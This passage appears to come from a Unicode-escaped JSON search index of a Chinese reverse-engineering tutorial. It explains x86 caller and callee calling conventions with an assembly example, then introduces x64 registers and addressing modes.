\u56e0\u4e3a\u6808\u5c06\u5904\u4e8e\u4e0d\u4e00\u81f4\u7684\u72b6\u6001; \u56e0\u6b64, \u5728\u4f60\u81ea\u5df1\u7684\u5b50\u4f8b\u7a0b\u4e2d\u5b9e\u73b0\u8c03\u7528\u7ea6\u5b9a\u7684\u65f6\u5019, \u52a1\u5fc5\u5f53\u5fc3. \u5c06\u8c03\u7528\u7ea6\u5b9a\u53ef\u89c6\u5316\u7684\u4e00\u79cd\u597d\u65b9\u6cd5\u662f, \u5728\u5b50\u4f8b\u7a0b\u6267\u884c\u671f\u95f4\u753b\u4e00\u4e2a\u6808\u5185\u5b58\u9644\u8fd1\u7684\u56fe. \u56fe 2 \u63cf\u7ed8\u4e86\u5728\u6267\u884c\u5177\u6709\u4e09\u4e2a\u53c2\u6570\u548c\u4e09\u4e2a\u5c40\u90e8\u53d8\u91cf\u7684\u5b50\u7a0b\u5e8f\u671f\u95f4\u6808\u7684\u5185\u5bb9. \u6808\u4e2d\u63cf\u7ed8\u7684\u5355\u5143\u90fd\u662f 32 \u4f4d\u5185\u5b58\u5355\u5143, \u56e0\u6b64\u8fd9\u4e9b\u5355\u5143\u7684\u5185\u5b58\u5730\u5740\u76f8\u9694 4 \u4e2a\u5b57\u8282. \u7b2c\u4e00\u4e2a\u53c2\u6570\u4f4d\u4e8e\u8ddd\u57fa\u6307\u9488 8 \u4e2a\u5b57\u8282\u7684\u504f\u79fb\u5904. \u5728\u6808\u53c2\u6570\u7684\u4e0a\u65b9 ( \u548c\u57fa\u6307\u9488\u4e0b\u65b9 ), call \u6307\u4ee4\u5728\u8fd9\u653e\u4e86\u8fd4\u56de\u5730\u5740, \u4ece\u800c\u5bfc\u81f4\u4ece\u57fa\u6307\u9488\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u6709\u989d\u5916 4 \u4e2a\u5b57\u8282\u7684\u504f\u79fb\u91cf. \u5f53 ret \u6307\u4ee4\u7528\u4e8e\u4ece\u5b50\u7a0b\u5e8f\u8fd4\u56de\u65f6, \u5b83\u5c06\u8df3\u8f6c\u5230\u6808\u4e2d\u7684\u8fd4\u56de\u5730\u5740.","title":"3.3.5 \u8c03\u7528\u7ea6\u5b9a Calling Convention"},{"location":"Tutorial/Material/Reverse/#3351-caller-rules","text":"\u8981\u8fdb\u884c\u5b50\u7a0b\u5e8f\u8c03\u7528, \u8c03\u7528\u8005\u5e94\u8be5 : \u5728\u8c03\u7528\u5b50\u4f8b\u7a0b\u4e4b\u524d, \u8c03\u7528\u8005\u5e94\u8be5\u4fdd\u5b58\u6307\u5b9a\u8c03\u7528\u8005\u4fdd\u5b58 ( Caller-saved )\u7684\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u5185\u5bb9. \u8c03\u7528\u8005\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u662f EAX, ECX, EDX. \u7531\u4e8e\u88ab\u8c03\u7528\u7684\u5b50\u7a0b\u5e8f\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e9b\u5bc4\u5b58\u5668, \u6240\u4ee5\u5982\u679c\u8c03\u7528\u8005\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u540e\u4f9d\u8d56\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c, \u8c03\u7528\u8005\u5fc5\u987b\u5c06\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u5165\u6808, \u7136\u540e\u5c31\u53ef\u4ee5\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u540e\u6062\u590d\u5b83\u4eec. \u8981\u628a\u53c2\u6570\u4f20\u9012\u7ed9\u5b50\u4f8b\u7a0b, \u4f60\u53ef\u4ee5\u5728\u8c03\u7528\u4e4b\u524d\u628a\u53c2\u6570\u5165\u6808. \u53c2\u6570\u7684\u5165\u6808\u987a\u5e8f\u5e94\u8be5\u662f\u53cd\u7740\u7684, \u5c31\u662f\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u5e94\u8be5\u6700\u5148\u5165\u6808. \u968f\u7740\u6808\u5185\u5b58\u5730\u5740\u589e\u5927, \u7b2c\u4e00\u4e2a\u53c2\u6570\u5c06\u5b58\u50a8\u5728\u6700\u4f4e\u7684\u5730\u5740, \u5728\u5386\u53f2\u4e0a, \u8fd9\u79cd\u53c2\u6570\u7684\u53cd\u8f6c\u7528\u4e8e\u5141\u8bb8\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570. \u8981\u8c03\u7528\u5b50\u4f8b\u7a0b, \u8bf7\u4f7f\u7528 call \u6307\u4ee4. \u8be5\u6307\u4ee4\u5c06\u8fd4\u56de\u5730\u5740\u5b58\u5230\u6808\u4e0a, \u5e76\u8df3\u8f6c\u5230\u5b50\u7a0b\u5e8f\u7684\u4ee3\u7801. \u8fd9\u4e2a\u4f1a\u8c03\u7528\u5b50\u7a0b\u5e8f, \u8fd9\u4e2a\u5b50\u7a0b\u5e8f\u5e94\u8be5\u9075\u5faa\u4e0b\u9762\u7684\u88ab\u8c03\u7528\u8005\u7ea6\u5b9a. \u5b50\u7a0b\u5e8f\u8fd4\u56de\u540e ( \u7d27\u8ddf\u8c03\u7528\u6307\u4ee4\u540e ), \u8c03\u7528\u8005\u53ef\u4ee5\u671f\u671b\u5728\u5bc4\u5b58\u5668 EAX \u4e2d\u627e\u5230\u5b50\u4f8b\u7a0b\u7684\u8fd4\u56de\u503c. \u8981\u6062\u590d\u673a\u5668\u72b6\u6001 ( machine state ), \u8c03\u7528\u8005\u5e94\u8be5 : \u4ece\u6808\u4e2d\u5220\u9664\u53c2\u6570, \u8fd9\u4f1a\u628a\u6808\u6062\u590d\u5230\u8c03\u7528\u4e4b\u524d\u7684\u72b6\u6001. \u628a EAX, ECX, EDX \u4e4b\u524d\u5165\u6808\u7684\u5185\u5bb9\u7ed9\u51fa\u6808, \u8c03\u7528\u8005\u53ef\u4ee5\u5047\u8bbe\u5b50\u4f8b\u7a0b\u6ca1\u6709\u4fee\u6539\u5176\u5b83\u5bc4\u5b58\u5668. \u4f8b\u5b50 \u4e0b\u9762\u7684\u4ee3\u7801\u5c31\u662f\u4e2a\u6d3b\u751f\u751f\u7684\u4f8b\u5b50, \u5b83\u5c55\u793a\u4e86\u9075\u5faa\u7ea6\u5b9a\u7684\u51fd\u6570\u8c03\u7528. \u8c03\u7528\u8005\u6b63\u5728\u8c03\u7528\u4e00\u4e2a\u5e26\u6709 3 \u4e2a\u6574\u6570\u53c2\u6570\u7684\u51fd\u6570 myFunc. \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f EAX, \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5e38\u6570 216; \u7b2c\u4e09\u4e2a\u53c2\u6570\u4f4d\u4e8e EBX \u7684\u503c\u6240\u4ee3\u8868\u7684\u5185\u5b58\u5730\u5740. push (%ebx) ;\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u6700\u5148\u5165\u6808 push $216 ;\u628a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5165\u6808 push %eax ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u6700\u540e\u5165\u6808 call myFunc ;\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570 ( \u5047\u8bbe\u4ee5 C \u8bed\u8a00\u7684\u6a21\u5f0f\u547d\u540d ) add $12, %esp \u6ce8\u610f, \u5728\u8c03\u7528\u8fd4\u56de\u540e, \u8c03\u7528\u8005\u4f7f\u7528 add \u6307\u4ee4\u6765\u6e05\u7406\u6808\u5185\u5b58. \u6211\u4eec\u6808\u5185\u5b58\u4e2d\u6709 12 \u4e2a\u5b57\u8282 ( 3 \u4e2a\u53c2\u6570, \u6bcf\u4e2a\u53c2\u6570 4 \u4e2a\u5b57\u8282 ), \u7136\u540e\u6808\u5185\u5b58\u5730\u5740\u589e\u5927. \u56e0\u6b64, \u4e3a\u4e86\u6446\u8131\u6389\u8fd9\u4e9b\u53c2\u6570, \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5f80\u6808\u91cc\u9762\u52a0\u4e2a 12. myFunc \u751f\u6210\u7684\u7ed3\u679c\u73b0\u5728\u53ef\u4ee5\u6709\u7528\u4e8e\u5bc4\u5b58\u5668 EAX. \u8c03\u7528\u8005\u4fdd\u5b58 ( Caller-saved ) \u7684\u5bc4\u5b58\u5668 ( ECX, EDX ) \u7684\u503c\u53ef\u80fd\u5df2\u7ecf\u88ab\u4fee\u6539. \u5982\u679c\u8c03\u7528\u8005\u5728\u8c03\u7528\u4e4b\u540e\u4f7f\u7528\u5b83\u4eec\uff0c\u5219\u9700\u8981\u5728\u8c03\u7528\u4e4b\u524d\u5c06\u5b83\u4eec\u4fdd\u5b58\u5728\u5806\u6808\u4e2d\u5e76\u5728\u8c03\u7528\u4e4b\u540e\u6062\u590d\u5b83\u4eec. \u8bf4\u767d\u4e86\u5c31\u662f\u628a\u6808\u8fd9\u4e2a\u73a9\u610f\u5f53\u4f5c\u4e34\u65f6\u5b58\u653e\u70b9.","title":"3.3.5.1 \u8c03\u7528\u8005\u7ea6\u5b9a Caller Rules"},{"location":"Tutorial/Material/Reverse/#3352-callee-rules","text":"\u5b50\u4f8b\u7a0b\u7684\u5b9a\u4e49\u5e94\u8be5\u9075\u5faa\u5b50\u4f8b\u7a0b\u5f00\u5934\u7684\u4ee5\u4e0b\u89c4\u5219 : 1.\u5c06 EBP \u7684\u503c\u5165\u6808, \u7136\u540e\u7528\u4e0b\u9762\u7684\u6307\u793a\u4fe1\u606f\u628a ESP \u7684\u503c\u590d\u5236\u5230 EBP \u4e2d : push %ebp mov %esp, %ebp \u8fd9\u4e2a\u521d\u59cb\u64cd\u4f5c\u4fdd\u7559\u4e86\u57fa\u6307\u9488 EBP. \u6309\u7167\u7ea6\u5b9a, \u57fa\u6307\u9488\u4f5c\u4e3a\u6808\u4e0a\u627e\u5230\u53c2\u6570\u548c\u53d8\u91cf\u7684\u53c2\u8003\u70b9. \u5f53\u5b50\u7a0b\u5e8f\u6b63\u5728\u6267\u884c\u7684\u65f6\u5019, \u57fa\u6307\u9488\u4fdd\u5b58\u4e86\u4ece\u5b50\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u662f\u7684\u6808\u6307\u9488\u503c\u7684\u526f\u672c. \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u5c06\u59cb\u7ec8\u4f4d\u4e8e\u8fdc\u79bb\u57fa\u6307\u9488\u503c\u7684\u5df2\u77e5\u5e38\u91cf\u504f\u79fb\u5904. \u6211\u4eec\u5728\u5b50\u4f8b\u7a0b\u7684\u5f00\u5934\u63a8\u9001\u65e7\u7684\u57fa\u6307\u9488\u503c\uff0c\u4ee5\u4fbf\u7a0d\u540e\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u65f6\u4e3a\u8c03\u7528\u8005\u6062\u590d\u9002\u5f53\u7684\u57fa\u6307\u9488\u503c. \u8bb0\u4f4f, \u8c03\u7528\u8005\u4e0d\u5e0c\u671b\u5b50\u4f8b\u7a0b\u4fee\u6539\u57fa\u6307\u9488\u7684\u503c. \u7136\u540e\u6211\u4eec\u628a\u6808\u6307\u9488\u79fb\u52a8\u5230 EBP \u4e2d, \u4ee5\u83b7\u53d6\u8bbf\u95ee\u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u7684\u53c2\u8003\u70b9. 2.\u63a5\u4e0b\u6765, \u901a\u8fc7\u5728\u6808\u4e2d\u521b\u5efa\u7a7a\u95f4\u6765\u5206\u914d\u5c40\u90e8\u53d8\u91cf. \u56de\u60f3\u4e00\u4e0b, \u6808\u4f1a\u5411\u4e0b\u589e\u957f, \u56e0\u6b64\u8981\u5728\u6808\u9876\u90e8\u521b\u5efa\u7a7a\u95f4, \u6808\u6307\u9488\u5e94\u8be5\u9012\u51cf. \u6808\u6307\u9488\u9012\u51cf\u7684\u6570\u91cf\u53d6\u51b3\u4e8e\u6240\u9700\u5c40\u90e8\u53d8\u91cf\u7684\u6570\u91cf\u548c\u5927\u5c0f. \u4f8b\u5982, \u5982\u679c\u9700\u8981 3 \u4e2a\u5c40\u90e8\u6574\u6570 ( \u6bcf\u4e2a 4 \u5b57\u8282 ), \u5219\u9700\u8981\u5c06\u5806\u6808\u6307\u9488\u9012\u51cf 12, \u4ece\u800c\u4e3a\u8fd9\u4e9b\u5c40\u90e8\u53d8\u91cf\u817e\u51fa\u7a7a\u95f4 ( \u5373sub $12, %esp ). \u548c\u53c2\u6570\u4e00\u6837, \u5c40\u90e8\u53d8\u91cf\u5c06\u4f4d\u4e8e\u57fa\u6307\u9488\u7684\u5df2\u77e5\u504f\u79fb\u5904. 3.\u63a5\u4e0b\u6765, \u4fdd\u5b58\u5c06\u7531\u51fd\u6570\u4f7f\u7528\u7684 \u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684 ( Callee-saved ) \u5bc4\u5b58\u5668\u7684\u503c. \u8981\u5b58\u50a8\u5bc4\u5b58\u5668, \u8bf7\u628a\u5b83\u4eec\u5165\u6808. \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 ( Callee-saved ) \u7684\u5bc4\u5b58\u5668\u662f EBX, EDI \u548c ESI ( ESP \u548c EBP \u4e5f\u5c06\u7531\u8c03\u7528\u7ea6\u5b9a\u4fdd\u7559, \u4f46\u5728\u8fd9\u4e2a\u6b65\u9aa4\u4e2d\u4e0d\u9700\u8981\u5165\u6808 ). \u5728\u5b8c\u6210\u8fd9 3 \u6b65\u4e4b\u540e, \u5b50\u4f8b\u7a0b\u7684\u4e3b\u4f53\u53ef\u4ee5\u7ee7\u7eed. \u8fd4\u56de\u5b50\u4f8b\u7a0b\u7684\u65f6\u5019, \u5fc5\u987b\u9075\u5faa\u4ee5\u4e0b\u6b65\u9aa4 : \u5c06\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 EAX \u4e2d. \u6062\u590d\u5df2\u7ecf\u88ab\u4fee\u6539\u7684\u4efb\u4f55\u88ab\u8c03\u7528\u8005\u4fdd\u5b58 ( Callee-saved ) \u7684\u5bc4\u5b58\u5668 ( EDI \u548c ESI ) \u7684\u65e7\u503c. \u901a\u8fc7\u51fa\u6808\u6765\u6062\u590d\u5b83\u4eec. \u5f53\u7136\u5e94\u8be5\u6309\u7167\u76f8\u53cd\u7684\u987a\u5e8f\u628a\u5b83\u4eec\u51fa\u6808. \u91ca\u653e\u5c40\u90e8\u53d8\u91cf. \u663e\u800c\u6613\u89c1\u7684\u6cd5\u5b50\u662f\u628a\u76f8\u5e94\u7684\u503c\u6dfb\u52a0\u5230\u6808\u6307\u9488 ( \u56e0\u4e3a\u7a7a\u95f4\u662f\u901a\u8fc7\u6808\u6307\u9488\u51cf\u53bb\u6240\u9700\u7684\u6570\u91cf\u6765\u5206\u914d\u7684 ). \u4e8b\u5b9e\u4e0a\u5462, \u89e3\u9664\u53d8\u91cf\u91ca\u653e\u7684\u9519\u8bef\u7684\u65b9\u6cd5\u662f\u5c06\u57fa\u6307\u9488\u4e2d\u7684\u503c\u79fb\u52a8\u5230\u6808\u6307\u9488 : mov %ebp, %esp . \u8fd9\u4e2a\u6cd5\u5b50\u6709\u6548, \u662f\u56e0\u4e3a\u57fa\u6307\u9488\u59cb\u7ec8\u5305\u542b\u6808\u6307\u9488\u5728\u5206\u914d\u5c40\u90e8\u53d8\u91cf\u4e4b\u524d\u5305\u542b\u7684\u503c. \u5728\u8fd4\u56de\u4e4b\u524d, \u7acb\u5373\u901a\u8fc7\u628a EBP \u51fa\u6808\u6765\u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c. \u56de\u60f3\u4e00\u4e0b, \u6211\u4eec\u5728\u8fdb\u5165\u5b50\u7a0b\u5e8f\u7684\u65f6\u5019\u505a\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u63a8\u52a8\u57fa\u6307\u9488\u4fdd\u5b58\u5b83\u7684\u65e7\u503c. \u6700\u540e, \u901a\u8fc7\u6267\u884c ret \u6307\u4ee4\u8fd4\u56de. \u8fd9\u4e2a\u6307\u4ee4\u5c06\u4ece\u6808\u4e2d\u627e\u5230\u5e76\u5220\u9664\u76f8\u5e94\u7684\u8fd4\u56de\u5730\u5740 ( call \u6307\u4ee4\u4fdd\u5b58\u7684\u90a3\u4e2a ). \u8bf7\u6ce8\u610f, \u88ab\u8c03\u7528\u8005\u7684\u7ea6\u5b9a\u5b8c\u5168\u88ab\u5206\u6210\u4e86\u4e24\u534a, \u7b80\u76f4\u662f\u5f7c\u6b64\u7684\u955c\u50cf. \u7ea6\u5b9a\u7684\u524d\u534a\u90e8\u5206\u9002\u7528\u4e8e\u51fd\u6570\u5f00\u5934, \u5e76\u4e14\u901a\u5e38\u88ab\u79f0\u4e3a\u5b9a\u4e49\u51fd\u6570\u7684 \u5e8f\u8a00 ( prologue ) .\u8fd9\u4e2a\u7ea6\u5b9a\u7684\u540e\u534a\u90e8\u5206\u9002\u7528\u4e8e\u51fd\u6570\u7ed3\u5c3e, \u56e0\u6b64\u901a\u5e38\u88ab\u79f0\u4e3a\u5b9a\u4e49\u51fd\u6570\u7684 \u7ed3\u5c3e ( epilogue ). \u4f8b\u5b50 \u8fd9\u662f\u4e00\u4e2a\u9075\u5faa\u88ab\u8c03\u7528\u8005\u7ea6\u5b9a\u7684\u4f8b\u5b50 : ;\u542f\u52a8\u4ee3\u7801\u90e8\u5206 .text ;\u5c06 myFunc \u5b9a\u4e49\u4e3a\u5168\u5c40 ( \u5bfc\u51fa ) \u51fd\u6570 .globl myFunc .type myFunc, @function myFunc : ;\u5b50\u7a0b\u5e8f\u5e8f\u8a00 push %ebp ;\u4fdd\u5b58\u57fa\u6307\u9488\u65e7\u503c mov %esp, %ebp ;\u8bbe\u7f6e\u57fa\u6307\u9488\u65b0\u503c sub $4, %esp ;\u4e3a\u4e00\u4e2a 4 \u5b57\u8282\u7684\u53d8\u91cf\u817e\u51fa\u4f4d\u7f6e push %edi push %esi ;\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4fee\u6539 EDI \u548c ESI, \u6240\u4ee5\u5148\u7ed9\u5b83\u4eec\u5165\u6808 ;\u4e0d\u9700\u8981\u4fdd\u5b58 EBX, EBP \u548c ESP ;\u5b50\u7a0b\u5e8f\u4e3b\u4f53 mov 8(%ebp), %eax ;\u628a\u53c2\u6570 1 \u7684\u503c\u79fb\u5230 EAX \u4e2d mov 12(%ebp), %esi ;\u628a\u53c2\u6570 2 \u7684\u503c\u79fb\u5230 ESI \u4e2d mov 16(%ebp), %edi ;\u628a\u53c2\u6570 3 \u7684\u503c\u79fb\u5230 EDI \u4e2d mov %edi, -4(%ebp) ;\u628a EDI \u79fb\u7ed9\u5c40\u90e8\u53d8\u91cf add %esi, -4(%ebp) ;\u628a ESI \u6dfb\u52a0\u7ed9\u5c40\u90e8\u53d8\u91cf add -4(%ebp), %eax ;\u5c06\u5c40\u90e8\u53d8\u91cf\u7684\u5185\u5bb9\u6dfb\u52a0\u5230 EAX ( \u6700\u7ec8\u7ed3\u679c ) \u4e2d ;\u5b50\u7a0b\u5e8f\u7ed3\u5c3e pop %esi ;\u6062\u590d\u5bc4\u5b58\u5668\u7684\u503c pop %edi mov %ebp, %esp ;\u91ca\u653e\u5c40\u90e8\u53d8\u91cf pop %ebp ;\u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c ret \u5b50\u7a0b\u5e8f\u5e8f\u8a00\u6267\u884c\u6807\u51c6\u64cd\u4f5c, \u5373\u5728 EBP ( \u57fa\u6307\u9488 ) \u4e2d\u4fdd\u5b58\u6808\u6307\u9488\u7684\u526f\u672c, \u901a\u8fc7\u9012\u51cf\u6808\u6307\u9488\u6765\u5206\u914d\u5c40\u90e8\u53d8\u91cf, \u5e76\u5728\u6808\u4e0a\u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u503c. \u5728\u5b50\u4f8b\u7a0b\u7684\u4e3b\u4f53\u4e2d, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u57fa\u6307\u9488\u7684\u4f7f\u7528. \u5728\u5b50\u7a0b\u5e8f\u6267\u884c\u671f\u95f4, \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u90fd\u4f4d\u4e8e\u4e0e\u57fa\u6307\u9488\u7684\u5e38\u91cf\u504f\u79fb\u5904. \u7279\u522b\u5730, \u6211\u4eec\u6ce8\u610f\u5230, \u7531\u4e8e\u53c2\u6570\u5728\u8c03\u7528\u5b50\u7a0b\u5e8f\u4e4b\u524d\u88ab\u653e\u5728\u6808\u4e2d, \u56e0\u6b64\u5b83\u4eec\u603b\u662f\u4f4d\u4e8e\u6808\u57fa\u6307\u9488 ( \u5373\u66f4\u9ad8\u7684\u5730\u5740 ) \u4e4b\u4e0b. \u5b50\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u603b\u662f\u53ef\u4ee5\u5728\u5185\u5b58\u5730\u5740 ( EBP+8 ) \u627e\u5230, \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5728 ( EBP+12 ), \u7b2c\u4e09\u4e2a\u53c2\u6570\u5728 ( EBP+16). \u7c7b\u4f3c\u5730, \u7531\u4e8e\u5728\u8bbe\u7f6e\u57fa\u6307\u9488\u540e\u5206\u914d\u5c40\u90e8\u53d8\u91cf, \u56e0\u6b64\u5b83\u4eec\u603b\u662f\u4f4d\u4e8e\u6808\u4e0a\u57fa\u6307\u9488 ( \u5373\u8f83\u4f4e\u5730\u5740 ) \u4e4b\u4e0a. \u7279\u522b\u662f, \u7b2c\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\u603b\u662f\u4f4d\u4e8e ( EBP-4 ), \u7b2c\u4e8c\u4e2a\u4f4d\u4e8e ( EBP-8 ), \u4ee5\u6b64\u7c7b\u63a8. \u8fd9\u79cd\u57fa\u6307\u9488\u7684\u5e38\u89c4\u4f7f\u7528, \u8ba9\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u8bc6\u522b\u51fd\u6570\u5185\u90e8\u5c40\u90e8\u53d8\u91cf\u548c\u53c2\u6570\u7684\u4f7f\u7528. \u51fd\u6570\u7ed3\u5c3e\u57fa\u672c\u4e0a\u662f\u51fd\u6570\u5e8f\u8a00\u7684\u955c\u50cf. \u4ece\u6808\u4e2d\u6062\u590d\u8c03\u7528\u8005\u7684\u5bc4\u5b58\u5668\u503c, \u901a\u8fc7\u91cd\u7f6e\u6808\u6307\u9488\u6765\u91ca\u653e\u5c40\u90e8\u53d8\u91cf, \u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c, \u5e76\u7528 ret \u6307\u4ee4\u8fd4\u56de\u8c03\u7528\u8005\u4e2d\u7684\u76f8\u5e94\u4ee3\u7801\u4f4d\u7f6e, \u4ece\u54ea\u6765\u56de\u54ea\u53bb. \u7ef4\u57fa\u767e\u79d1 X86 \u8c03\u7528\u7ea6\u5b9a","title":"3.3.5.2 \u88ab\u8c03\u7528\u8005\u7ea6\u5b9a Callee Rules"},{"location":"Tutorial/Material/Reverse/#34-x64","text":"","title":"3.4 x64 \u6c47\u7f16\u57fa\u7840"},{"location":"Tutorial/Material/Reverse/#341","text":"x86-64 (\u4e5f\u88ab\u79f0\u4e3a x64 \u6216\u8005 AMD64) \u662f 64 \u4f4d\u7248\u672c\u7684 x86/IA32 \u6307\u4ee4\u96c6. \u4ee5\u4e0b\u662f\u6211\u4eec\u5173\u4e8e CS107 \u76f8\u5173\u529f\u80fd\u7684\u6982\u8ff0.","title":"3.4.1 \u5bfc\u8bed"},{"location":"Tutorial/Material/Reverse/#342-registers","text":"\u4e0b\u56fe\u5217\u51fa\u4e86\u5e38\u7528\u7684\u5bc4\u5b58\u5668 ( 16\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u52a0\u4e0a 2 \u4e2a\u7279\u6b8a\u7528\u9014\u5bc4\u5b58\u5668 ). \u6bcf\u4e2a\u5bc4\u5b58\u5668\u90fd\u662f 64 bit \u5bbd, \u5b83\u4eec\u7684\u4f4e 32, 16, 8 \u4f4d\u90fd\u53ef\u4ee5\u770b\u6210\u76f8\u5e94\u7684 32, 16, 8 \u4f4d\u5bc4\u5b58\u5668, \u5e76\u4e14\u90fd\u6709\u5176\u7279\u6b8a\u540d\u79f0. \u4e00\u4e9b\u5bc4\u5b58\u5668\u88ab\u8bbe\u8ba1\u7528\u6765\u5b8c\u6210\u67d0\u4e9b\u7279\u6b8a\u76ee\u7684, \u6bd4\u5982 %rsp \u88ab\u7528\u6765\u4f5c\u4e3a\u6808\u6307\u9488, %rax \u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c. \u5176\u4ed6\u5bc4\u5b58\u5668\u5219\u90fd\u662f\u901a\u7528\u7684, \u4f46\u662f\u4e00\u822c\u5728\u4f7f\u7528\u7684\u65f6\u5019, \u8fd8\u662f\u8981\u53d6\u51b3\u4e8e\u8c03\u7528\u8005 ( Caller-owned )\u6216\u8005\u88ab\u8c03\u7528\u8005 ( Callee-owned ). \u5982\u679c\u51fd\u6570 binky \u8c03\u7528\u4e86 winky, \u6211\u4eec\u79f0 binky \u4e3a\u8c03\u7528\u8005, winky \u4e3a\u88ab\u8c03\u7528\u8005. \u4f8b\u5982, \u7528\u4e8e\u524d 6 \u4e2a\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u5bc4\u5b58\u5668\u90fd\u662f\u88ab\u8c03\u7528\u8005\u6240\u6709\u7684 ( Callee-owned ). \u88ab\u8c03\u7528\u8005\u53ef\u4ee5\u4efb\u610f\u4f7f\u7528\u8fd9\u4e9b\u5bc4\u5b58\u5668, \u4e0d\u7528\u4efb\u4f55\u9884\u9632\u63aa\u65bd\u5c31\u53ef\u4ee5\u968f\u610f\u8986\u76d6\u91cc\u9762\u7684\u5185\u5bb9. \u5982\u679c %rax \u5b58\u7740\u8c03\u7528\u8005\u60f3\u8981\u4fdd\u7559\u7684\u503c, \u5219 Caller \u5fc5\u987b\u5728\u8c03\u7528\u4e4b\u524d\u5c06\u8fd9\u4e2a %rax \u7684\u503c\u590d\u5236\u5230\u4e00\u4e2a \" \u5b89\u5168 \" \u7684\u4f4d\u7f6e. \u88ab\u8c03\u7528\u8005\u62e5\u6709\u7684 ( Callee-owned ) \u5bc4\u5b58\u5668\u975e\u5e38\u9002\u5408\u4e00\u4e9b\u4e34\u65f6\u6027\u7684\u4f7f\u7528. \u76f8\u53cd, \u5982\u679c\u88ab\u8c03\u7528\u8005\u6253\u7b97\u4f7f\u7528\u8c03\u7528\u8005\u6240\u62e5\u6709\u7684\u5bc4\u5b58\u5668, \u90a3\u4e48\u88ab\u8c03\u7528\u8005\u5fc5\u987b\u9996\u5148\u628a\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u5b58\u8d77\u6765, \u7136\u540e\u5728\u9000\u51fa\u8c03\u7528\u4e4b\u524d\u628a\u5b83\u6062\u590d. \u8c03\u7528\u8005\u62e5\u6709\u7684 ( Caller-owned ) \u5bc4\u5b58\u5668\u7528\u4e8e\u4fdd\u5b58\u8c03\u7528\u8005\u7684\u672c\u5730\u72b6\u6001 ( local state ), \u6240\u4ee5\u8fd9\u4e2a\u5bc4\u5b58\u5668\u9700\u8981\u5728\u8fdb\u4e00\u6b65\u7684\u51fd\u6570\u8c03\u7528\u4e2d\u88ab\u4fdd\u7559\u4e0b\u6765.","title":"3.4.2 \u5bc4\u5b58\u5668 Registers"},{"location":"Tutorial/Material/Reverse/#343-addressing-modes","text":"\u6b63\u7531\u4e8e\u5b83\u7684 CISC \u7279\u6027, X86-64 \u652f\u6301\u5404\u79cd\u5bfb\u5740\u6a21\u5f0f. \u5bfb\u5740\u6a21\u5f0f\u662f\u8ba1\u7b97\u8981\u8bfb\u6216\u5199\u7684\u5185\u5b58\u5730\u5740\u7684\u8868\u8fbe\u5f0f. \u8fd9\u4e9b\u8868\u8fbe\u5f0f\u7528\u4f5c mov \u6307\u4ee4\u548c\u8bbf\u95ee\u5185\u5b58\u7684\u5176\u5b83\u6307\u4ee4\u7684\u6765\u6e90\u548c\u53bb\u8def. \u4e0b\u9762\u7684\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u5728\u6bcf\u4e2a\u53ef\u7528\u7684\u5bfb\u5740\u6a21\u5f0f\u4e2d\u5c06 \u7acb\u5373\u6570 1 \u5199\u5165\u5404\u79cd\u5185\u5b58\u4f4d\u7f6e : movl $1, 0x604892 ;\u76f4\u63a5\u5199\u5165, \u5185\u5b58\u5730\u5740\u662f\u4e00\u4e2a\u5e38\u6570 movl $1, (%rax) ;\u95f4\u63a5\u5199\u5165, \u5185\u5b58\u5730\u5740\u5b58\u5728\u5bc4\u5b58\u5668 %rax \u4e2d movl $1, -24(%rbp) ;\u4f7f\u7528\u504f\u79fb\u91cf\u7684\u95f4\u63a5\u5199\u5165 ;\u516c\u5f0f : (address = base %rbp + displacement -24) movl $1, 8(%rsp, %rdi, 4) ;\u95f4\u63a5\u5199\u5165, \u7528\u5230\u4e86\u504f\u79fb\u91cf\u548c\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ) ;\u516c\u5f0f : (address = base %rsp + displ 8 + index %rdi * scale 4) movl $1, (%rax, %rcx, 8) ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u504f\u79fb\u91cf ( displacement ) \u4e3a 0 movl $1, 0x8(, %rdx, 4) ;\u7279\u6b8a\u60c5\u51b5, 